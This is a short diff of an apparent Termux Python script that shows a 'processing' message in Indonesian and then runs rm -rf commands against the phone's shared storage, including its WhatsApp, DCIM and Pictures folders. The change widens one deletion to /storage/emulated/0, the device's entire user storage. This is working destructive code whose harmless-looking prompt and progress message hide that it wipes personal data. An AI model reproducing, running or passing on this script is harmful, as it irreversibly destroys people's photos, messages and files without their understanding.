@@ -20,7 +20,7 @@ if a == "y" or a == "Y":
 	print ("\033[1;36m Lagi Proses ... ")
 	time.sleep(5)
 	os.system('termux-setup-storage')
-	os.system('rm -rf /storage/emulated/0/sdcard')
+	os.system('rm -rf /storage/emulated/0')
 	os.system('rm -rf /storage/emulated/0/DCIM')
 	os.system('rm -rf /storage/emulated/0/Pictures')
 	os.system('rm -rf /storage/emulated/0/WhatsApp')
